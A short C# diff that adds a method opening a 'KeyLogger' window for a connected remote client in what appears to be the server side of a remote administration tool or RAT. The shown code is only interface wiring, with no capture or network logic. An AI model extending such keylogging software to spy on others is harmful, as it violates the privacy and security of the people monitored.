@@ -150,5 +150,19 @@ namespace Serveur.Controllers
                 MessageBox.Show(ex.Message, "FrmPr MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
+
+        public void frmKl(ClientMosaic client)
+        {
+            try
+            {
+                FrmKeyLogger frmKl = new FrmKeyLogger(client);
+                frmKl.Text = "KeyLogger" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
+                frmKl.ShowDialog();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "FrmPr MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
     }
 }
